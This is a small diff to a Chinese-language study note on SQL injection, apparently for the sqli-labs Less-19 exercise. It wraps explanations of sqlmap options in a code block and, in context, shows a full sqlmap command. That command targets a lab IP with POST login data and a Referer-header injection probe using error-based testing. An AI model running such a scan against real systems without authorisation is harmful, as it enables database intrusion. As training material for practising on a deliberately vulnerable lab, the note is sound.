@@ -36,6 +36,7 @@ payload:
 
 ## SQLMAP ##
 
+```
 --data:指定请求数据
 
 --method:指定请求方式
@@ -49,6 +50,7 @@ payload:
 --level 3:加入检测User-Agent和Referer
 
 --technique E:检测报错注入
+```
 
 `sqlmap -u "http://10.60.250.66/sql/Less-19/" --data "uname=admin&passwd=admin&submit=Submit" --method POST --dbms mysql --threads 10 --referer "http://10.60.250.66/sql/Less-19/' and '1'='1" --level 3 --technique E `
 
